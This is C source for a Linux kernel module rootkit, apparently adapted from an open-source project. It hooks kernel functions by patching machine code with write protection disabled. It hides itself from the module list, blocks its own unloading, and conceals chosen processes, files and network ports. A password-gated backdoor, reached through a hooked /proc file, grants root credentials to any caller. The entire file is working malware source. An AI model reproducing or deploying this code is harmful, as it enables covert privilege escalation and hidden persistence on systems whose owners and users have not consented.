/*
 * Copyright (C) 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>

#define TMPSZ 150

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)

char *strnstr(const char *haystack, const char *needle, size_t len)
{
        int i;
        size_t needle_len;

        if (0 == (needle_len = strnlen(needle, len)))
                return (char *)haystack;

        for (i=0; i<=(int)(len-needle_len); i++)
        {
                if ((haystack[0] == needle[0]) &&
                        (0 == strncmp(haystack, needle, needle_len)))
                        return (char *)haystack;

                haystack++;
        }
        return NULL;
}

#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)  && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 16, 0)

struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0) && \
    	LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	struct proc_dir_entry *next, *parent, *subdir;
	#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 19, 0) && \
    	LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
	struct proc_dir_entry *parent;
	struct rb_root subdir;
    	struct rb_node subdir_node;
	#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
	struct proc_dir_entry *parent;
	struct rb_root_cached subdir;
    	struct rb_node subdir_node;
	#endif
	void *data;
	atomic_t count;		/* use count */
	atomic_t in_use;	/* number of callers into module in progress; */
			/* negative -> it's going away RSN */
	struct completion *pde_unload_completion;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
	u8 namelen;
	char name[];
};

#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 16, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)

struct proc_dir_entry {
	/*
	 * number of callers into module in progress;
	 * negative -> it's going away RSN
	 */
	atomic_t in_use;
	atomic_t count;		/* use count */
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	/* protects ->pde_openers and all struct pde_opener instances */
	spinlock_t pde_unload_lock;
	struct completion *pde_unload_completion;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	void *data;
	unsigned int low_ino;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	struct proc_dir_entry *parent;
	struct rb_root_cached subdir;
	struct rb_node subdir_node;
	umode_t mode;
	u8 namelen;
	char name[];
};

#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)

struct proc_dir_entry {
	/*
	 * number of callers into module in progress;
	 * negative -> it's going away RSN
	 */
	atomic_t in_use;
	refcount_t refcnt;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	/* protects ->pde_openers and all struct pde_opener instances */
	spinlock_t pde_unload_lock;
	struct completion *pde_unload_completion;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	void *data;
	unsigned int low_ino;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	char *name;
	umode_t mode;
	u8 namelen;
#ifdef CONFIG_64BIT
#define SIZEOF_PDE_INLINE_NAME	(192-139)
#else
#define SIZEOF_PDE_INLINE_NAME	(128-87)
#endif
	char inline_name[SIZEOF_PDE_INLINE_NAME];
};

#endif

#include "config.h"

//#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Juan Schällibaum <juanschallibaum@gmail.com>");
//MODULE_AUTHOR("Maxim Biro <nurupo.contributions@gmail.com>");


#define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
    "It should be easy to port to new architectures though"

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);


// ========== ASM HOOK LIST ==========

#if defined __i386__
    // push 0x00000000, ret
    #define ASM_HOOK_CODE "\x68\x00\x00\x00\x00\xc3"
    #define ASM_HOOK_CODE_OFFSET 1
    // alternativly we could do `mov eax 0x00000000, jmp eax`, but it's a byte longer
    //#define ASM_HOOK_CODE "\xb8\x00\x00\x00\x00\xff\xe0"
#elif defined __x86_64__
    // there is no push that pushes a 64-bit immidiate in x86_64,
    // so we do things a bit differently:
    // mov rax 0x0000000000000000, jmp rax
    #define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
    #define ASM_HOOK_CODE_OFFSET 2
#else
    #error ARCH_ERROR_MESSAGE
#endif

struct asm_hook {
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE)-1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

/**
 * Patches machine code of the original function to call another function.
 * This function should not be called directly.
 */
void _asm_hook_patch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE)-1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Patches machine code of a function so that it would call our function.
 * Keeps record of the original function and its machine code so that it could
 * be unpatched and patched again later.
 *
 * @param original_function Function to patch
 *
 * @param modified_function Function that should be called
 *
 * @return true on success, false on failure.
 */
int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}

/**
 * Patches the original function to call the modified function again.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void asm_hook_patch(void *modified_function)
{
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_patch(h);
            break;
        }
    }
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 * This function should not be called directly.
 */
void _asm_hook_unpatch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE)-1);
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

/**
 * Removes all hook records, unpatches all functions.
 */
void asm_hook_remove_all(void)
{
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}


// ========== END ASM HOOK LIST ==========

/*
unsigned long asm_rmdir_count = 0;

asmlinkage long asm_rmdir(const char __user *pathname)
{
    long ret;
	
    asm_rmdir_count ++;

    asmlinkage long (*original_rmdir)(const char __user *);
    original_rmdir = asm_hook_unpatch(asm_rmdir);
    ret = original_rmdir(pathname);
    asm_hook_patch(asm_rmdir);

    return ret;
}
*/


// ========== PID LIST ==========


struct pid_entry {
    unsigned long pid;
    struct list_head list;
};

LIST_HEAD(pid_list);

int pid_add(const char *pid)
{
    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);

    if (!p) {
        return 0;
    }

    p->pid = simple_strtoul(pid, NULL, 10);

    list_add(&p->list, &pid_list);

    return 1;
}

void pid_remove(const char *pid)
{
    struct pid_entry *p, *tmp;

    unsigned long pid_num = simple_strtoul(pid, NULL, 10);

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        if (p->pid == pid_num) {
            list_del(&p->list);
            kfree(p);
            break;
        }
    }
}

void pid_remove_all(void)
{
    struct pid_entry *p, *tmp;

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        list_del(&p->list);
        kfree(p);
    }
}


// ========== END PID LIST ==========


// ========== TCP PORT LIST ==========

struct hidden_port {
    unsigned short port;
    //unsigned long port;
    struct list_head list;
};

LIST_HEAD(hidden_tcp4_ports);
LIST_HEAD(hidden_tcp6_ports);
LIST_HEAD(hidden_udp4_ports);
LIST_HEAD(hidden_udp6_ports);

void hide_tcp4_port(const char *port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    //hp->port = port;
    hp->port = simple_strtoul(port, NULL, 10);

    list_add(&hp->list, &hidden_tcp4_ports);
}

void unhide_tcp4_port(const char *port)
{
    struct hidden_port *hp;
	
    unsigned long port_num = simple_strtoul(port, NULL, 10);

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        if ( port_num == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_tcp6_port (const char *port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = simple_strtoul(port, NULL, 10);

    list_add(&hp->list, &hidden_tcp6_ports);
}

void unhide_tcp6_port (const char *port)
{
    struct hidden_port *hp;
	
    unsigned long port_num = simple_strtoul(port, NULL, 10);

    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
    {
        if ( port_num == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

// ========== END TCP PORT LIST ==========


// ========== UDP PORT LIST ==========

void hide_udp4_port (const char *port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    //hp->port = port;
    hp->port = simple_strtoul(port, NULL, 10);

    list_add(&hp->list, &hidden_udp4_ports);
}

void unhide_udp4_port (const char *port)
{
    struct hidden_port *hp;
	
    unsigned long port_num = simple_strtoul(port, NULL, 10);

    list_for_each_entry ( hp, &hidden_udp4_ports, list )
    {
        if ( port_num == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_udp6_port (const char *port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = simple_strtoul(port, NULL, 10);

    list_add(&hp->list, &hidden_udp6_ports);
}

void unhide_udp6_port (const char *port)
{
    struct hidden_port *hp;
	
    unsigned long port_num = simple_strtoul(port, NULL, 10);

    list_for_each_entry ( hp, &hidden_udp6_ports, list )
    {
        if ( port_num == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

// ========== END UDP PORT LIST ==========


// ========== FILE LIST ==========


struct file_entry {
    char *name;
    struct list_head list;
};

LIST_HEAD(file_list);

int file_add(const char *name)
{
    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);
    size_t name_len;

    if (!f) {
        return 0;
    }

    name_len = strlen(name) + 1;

    // sanity check as `name` could point to some garbage without null anywhere nearby
    if (name_len -1 > NAME_MAX) {
        kfree(f);
        return 0;
    }

    f->name = kmalloc(name_len, GFP_KERNEL);
    if (!f->name) {
        kfree(f);
        return 0;
    }

    strncpy(f->name, name, name_len);

    list_add(&f->list, &file_list);

    return 1;
}

void file_remove(const char *name)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        if (strcmp(f->name, name) == 0) {
            list_del(&f->list);
            kfree(f->name);
            kfree(f);
            break;
        }
    }
}

void file_remove_all(void)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        list_del(&f->list);
        kfree(f->name);
        kfree(f);
    }
}


// ========== END FILE LIST ==========


// ========== HIDE ==========


struct list_head *module_list;
int is_hidden = 0;

void hide(void)
{
    if (is_hidden) {
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    is_hidden = 1;
}


void unhide(void)
{
    if (!is_hidden) {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    is_hidden = 0;
}


// ========== END HIDE ==========


// ========== PROTECT ==========


int is_protected = 0;

void protect(void)
{
    if (is_protected) {
        return;
    }

    try_module_get(THIS_MODULE);

    is_protected = 1;
}

void unprotect(void)
{
    if (!is_protected) {
        return;
    }

    module_put(THIS_MODULE);

    is_protected = 0;
}


// ========== END PROTECT ==========


// ========== READDIR ==========


struct file_operations *get_fop(const char *path)
{
    struct file *file;
    struct file_operations *ret;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
        return NULL;
    }

    ret = (struct file_operations *) file->f_op;
    filp_close(file, 0);

    return ret;
}


void *get_tcp_seq_show ( const char *path )
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
    #elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
    #else
    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
    #endif
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}


void *get_udp_seq_show ( const char *path )
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
    #elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
    #else
    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
    #endif

    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}


static int n_tcp4_seq_show ( struct seq_file *seq, void *v)
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

/*
    hijack_pause(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack_resume(tcp4_seq_show);
*/
	
    int (*original_tcp4_seq_show)(struct seq_file *, void *);
    original_tcp4_seq_show = asm_hook_unpatch(n_tcp4_seq_show);
    ret = original_tcp4_seq_show(seq, v);
    asm_hook_patch(n_tcp4_seq_show);

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;
/*
    hijack_pause(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hijack_resume(tcp6_seq_show);
*/
	
    int (*original_tcp6_seq_show)(struct seq_file *, void *);
    original_tcp6_seq_show = asm_hook_unpatch(n_tcp6_seq_show);
    ret = original_tcp6_seq_show(seq, v);
    asm_hook_patch(n_tcp6_seq_show);

    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;
/*
    hijack_pause(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hijack_resume(udp4_seq_show);
*/
    int (*original_udp4_seq_show)(struct seq_file *, void *);
    original_udp4_seq_show = asm_hook_unpatch(n_udp4_seq_show);
    ret = original_udp4_seq_show(seq, v);
    asm_hook_patch(n_udp4_seq_show);

    list_for_each_entry ( hp, &hidden_udp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;
/*
    hijack_pause(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hijack_resume(udp6_seq_show);
	
    */
    int (*original_udp6_seq_show)(struct seq_file *, void *);
    original_udp6_seq_show = asm_hook_unpatch(n_udp6_seq_show);
    ret = original_udp6_seq_show(seq, v);
    asm_hook_patch(n_udp6_seq_show);

    list_for_each_entry ( hp, &hidden_udp6_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

// Macros to help reduce repeated code where only names differ.
// Decreses risk of "copy-paste & forgot to rename" error.

//static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type)

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	#define FILLDIR_START(NAME) \
	    filldir_t original_##NAME##_filldir; \
	    \
	    static int NAME##_filldir(void *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
	    {
#else
	#define FILLDIR_START(NAME) \
	    filldir_t original_##NAME##_filldir; \
	    \
	    static int NAME##_filldir(struct dir_context *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
            {
#endif

#define FILLDIR_END(NAME) \
        return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
    }


#if LINUX_VERSION_CODE <= KERNEL_VERSION(3, 3, 0)

    #define READDIR(NAME) \
        int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
        { \
	    int ret; \
	    int (*original_readdir)(struct file *, void *, filldir_t); \
            original_##NAME##_filldir = filldir; \
            \
            original_readdir = asm_hook_unpatch(NAME##_readdir); \
            ret = original_readdir(file, dirent, NAME##_filldir); \
            asm_hook_patch(NAME##_readdir); \
            \
            return ret; \
        }

#elif LINUX_VERSION_CODE > KERNEL_VERSION(3, 3, 0)

    #define READDIR(NAME) \
        int NAME##_iterate(struct file *file, struct dir_context *context) \
        { \
	    int ret; \
	    int (*original_iterate)(struct file *, struct dir_context *); \
            original_##NAME##_filldir = context->actor; \
	    *((filldir_t*)&context->actor) = NAME##_filldir; \
            \
            original_iterate = asm_hook_unpatch(NAME##_iterate); \
            ret = original_iterate(file, context); \
            asm_hook_patch(NAME##_iterate); \
            \
            return ret; \
        }


#else

//#error "Wrong Linux kernel version"

#endif

// Macros to actually use
#define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
#define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) READDIR(NAME)

READDIR_HOOK_START(root)
    struct file_entry *f;

    list_for_each_entry(f, &file_list, list) {
        if (strcmp(name, f->name) == 0) {
            return 0;
        }
    }
READDIR_HOOK_END(root)

READDIR_HOOK_START(proc)
    struct pid_entry *p;

    list_for_each_entry(p, &pid_list, list) {
        if (simple_strtoul(name, NULL, 10) == p->pid) {
            return 0;
        }
    }
READDIR_HOOK_END(proc)

READDIR_HOOK_START(sys)
    if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0) {
        return 0;
    }
READDIR_HOOK_END(sys)


#undef FILLDIR_START
#undef FILLDIR_END
#undef READDIR

#undef READDIR_HOOK_START
#undef READDIR_HOOK_END


// ========== END READDIR ==========


int execute_command(const char __user *str, size_t length)
{
    if (length <= sizeof(CFG_PASS) ||
        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0) {
        return 0;
    }

    pr_info("Password check passed\n");

    // since the password matched, we assume the command following the password
    // is in the valid format

    str += sizeof(CFG_PASS);

    if (strcmp(str, CFG_ROOT) == 0) {
	struct cred *creds = prepare_creds();
        pr_info("Got root command\n");

//#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 5, 0)
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 13, 0)
        
        creds->uid = creds->euid = 0;
        creds->gid = creds->egid = 0;
        
//#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 13, 0)

        creds->uid.val = creds->euid.val = 0;
        creds->gid.val = creds->egid.val = 0;



#endif

        commit_creds(creds);
    } else if (strcmp(str, CFG_HIDE_PID) == 0) {
        pr_info("Got hide pid command\n");
        str += sizeof(CFG_HIDE_PID);
        pid_add(str);
    } else if (strcmp(str, CFG_UNHIDE_PID) == 0) {
        pr_info("Got unhide pid command\n");
        str += sizeof(CFG_UNHIDE_PID);
        pid_remove(str);	    
    } else if (strcmp(str, CFG_HIDE_TCP_PORT) == 0) {
        pr_info("Got hide tcp port command\n");
        str += sizeof(CFG_HIDE_TCP_PORT);
	hide_tcp4_port(str);	    
    } else if (strcmp(str, CFG_UNHIDE_TCP_PORT) == 0) {
        pr_info("Got unhide tcp port command\n");
        str += sizeof(CFG_UNHIDE_TCP_PORT);
        unhide_tcp4_port(str);    
    } else if (strcmp(str, CFG_HIDE_TCP6_PORT) == 0) {
        pr_info("Got hide tcp6 port command\n");
        str += sizeof(CFG_HIDE_TCP6_PORT);
	hide_tcp6_port(str);	    
    } else if (strcmp(str, CFG_UNHIDE_TCP6_PORT) == 0) {
        pr_info("Got unhide tcp6 port command\n");
        str += sizeof(CFG_UNHIDE_TCP6_PORT);
        unhide_tcp6_port(str);	       
    } else if (strcmp(str, CFG_HIDE_UDP_PORT) == 0) {
        pr_info("Got hide udp port command\n");
        str += sizeof(CFG_HIDE_UDP_PORT);
	hide_udp4_port(str);
    } else if (strcmp(str, CFG_UNHIDE_UDP_PORT) == 0) {
        pr_info("Got unhide udp port command\n");
        str += sizeof(CFG_UNHIDE_UDP_PORT);
        unhide_udp4_port(str);	    
    } else if (strcmp(str, CFG_HIDE_UDP6_PORT) == 0) {
        pr_info("Got hide udp6 port command\n");
        str += sizeof(CFG_HIDE_UDP6_PORT);
	hide_udp6_port(str);
    } else if (strcmp(str, CFG_UNHIDE_UDP6_PORT) == 0) {
        pr_info("Got unhide udp6 port command\n");
        str += sizeof(CFG_UNHIDE_UDP6_PORT);
        unhide_udp6_port(str);	    
    } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
        pr_info("Got hide file command\n");
        str += sizeof(CFG_HIDE_FILE);
        file_add(str);
    } else if (strcmp(str, CFG_UNHIDE_FILE) == 0) {
        pr_info("Got unhide file command\n");
        str += sizeof(CFG_UNHIDE_FILE);
        file_remove(str);
    }  else if (strcmp(str, CFG_HIDE) == 0) {
        pr_info("Got hide command\n");
        hide();
    } else if (strcmp(str, CFG_UNHIDE) == 0) {
        pr_info("Got unhide command\n");
        unhide();
    } else if (strcmp(str, CFG_PROTECT) == 0) {
        pr_info("Got protect command\n");
        protect();
    } else if (strcmp(str, CFG_UNPROTECT) == 0) {
        pr_info("Got unprotect command\n");
        unprotect();
    } else {
        pr_info("Got unknown command\n");
    }

    return 1;
}


// ========== COMM CHANNEL ==========


static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
{
    ssize_t ret;
    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
	
    if (execute_command(buf_user, count)) {
        return count;
    }

    original_write = asm_hook_unpatch(proc_fops_write);
    ret = original_write(file, buf_user, count, p);
    asm_hook_patch(proc_fops_write);

    return ret;
}

static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
{
    ssize_t ret;
    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
	
    execute_command(buf_user, count);

    original_read = asm_hook_unpatch(proc_fops_read);
    ret = original_read(file, buf_user, count, p);
    asm_hook_patch(proc_fops_read);

    return ret;
}


int setup_proc_comm_channel(void)
{
    struct file_operations *proc_fops = NULL;
    static const struct file_operations proc_file_fops;
    struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 19, 0)
    struct rb_node *entry;
    #endif
	
    pr_info("Proc name: %s\n",proc_entry->name);
	
    proc_entry = proc_entry->parent;
	
    pr_info("Parent name: %s\n",proc_entry->name);

    if (strcmp(proc_entry->name, "/proc") != 0) {
        pr_info("Couldn't find \"/proc\" entry\n");
        remove_proc_entry("temporary", NULL);
        return 0;
    }

    remove_proc_entry("temporary", NULL);

	
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)

    proc_entry = proc_entry->subdir;

    while (proc_entry) {
        pr_info("Looking at \"/proc/%s\"\n", proc_entry->name);

        if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
            proc_fops = (struct file_operations *) proc_entry->proc_fops;
            goto found;
        }

        proc_entry = proc_entry->next;
    }
	
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 19, 0)

    #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0) || \
    	LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
    entry = rb_first(&proc_entry->subdir);
    #elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0) && \
    	LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
    entry = rb_first(&proc_entry->subdir.rb_root);
    #endif

    while (entry) {
        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);

        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
            goto found;
        }

        entry = rb_next(entry);
    }
	
#endif

    pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);

    return 0;

found:
    ;

    if (proc_fops->write) {
        asm_hook_create(proc_fops->write, proc_fops_write);
    }

    if (proc_fops->read) {
        asm_hook_create(proc_fops->read, proc_fops_read);
    }

    if (!proc_fops->read && !proc_fops->write) {
        pr_info("\"/proc/%s\" has no write nor read function set\n", CFG_PROC_FILE);
        return 0;
    }

    return 1;
}

// ========== END COMM CHANNEL ==========


int init(void)
{
    pr_info("Module loaded\n");
    hide();
    protect();

    if (!setup_proc_comm_channel()) {
        pr_info("Failed to set up comm channel\n");
        unprotect();
        unhide();
        return -1;
    }

    pr_info("Comm channel is set up\n");
	
    asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), n_tcp4_seq_show);
    asm_hook_create(get_tcp_seq_show("/proc/net/tcp6"), n_tcp6_seq_show);
    asm_hook_create(get_udp_seq_show("/proc/net/udp"), n_udp4_seq_show);
    asm_hook_create(get_udp_seq_show("/proc/net/udp6"), n_udp6_seq_show);	

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
      LINUX_VERSION_CODE < KERNEL_VERSION(3, 3, 0) 
	
    asm_hook_create(get_fop("/")->readdir, root_readdir);
    asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
    asm_hook_create(get_fop("/sys")->readdir, sys_readdir);

#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 3, 0) && \
      LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0) 

    asm_hook_create(get_fop("/")->iterate, root_iterate);
    asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);

#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 5, 0)

    asm_hook_create(get_fop("/")->iterate_shared, root_iterate);
    asm_hook_create(get_fop("/proc")->iterate_shared, proc_iterate);
    asm_hook_create(get_fop("/sys")->iterate_shared, sys_iterate);

#endif

    return 0;
}

void exit_func(void)
{
    asm_hook_remove_all();
    pid_remove_all();
    file_remove_all();

    THIS_MODULE->name[0] = 0;

    pr_info("Module removed\n");
}

module_init(init);
module_exit(exit_func);
